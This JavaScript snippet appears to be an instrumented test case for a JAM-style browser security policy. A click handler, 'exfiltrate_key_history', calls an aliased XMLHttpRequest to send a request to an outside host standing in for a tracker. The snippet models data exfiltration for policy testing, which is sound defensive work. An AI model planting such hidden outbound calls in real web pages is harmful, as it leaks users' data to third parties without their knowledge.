function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  var v0 = xmlhttp;
  var v2 = xmlhttp.open;
  introspect(JAM.policy.p1) {
    var v3 = v2.bind(xmlhttp)
  }
  v0.opennew = v3;
  introspect(JAM.policy.p1) {
    xmlhttp.opennew("GET", "http://AnalyticsInc:8000/submission.html?test=clone2", true)
  }
  introspect(JAM.policy.p1) {
    xmlhttp.send(null)
  }
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;
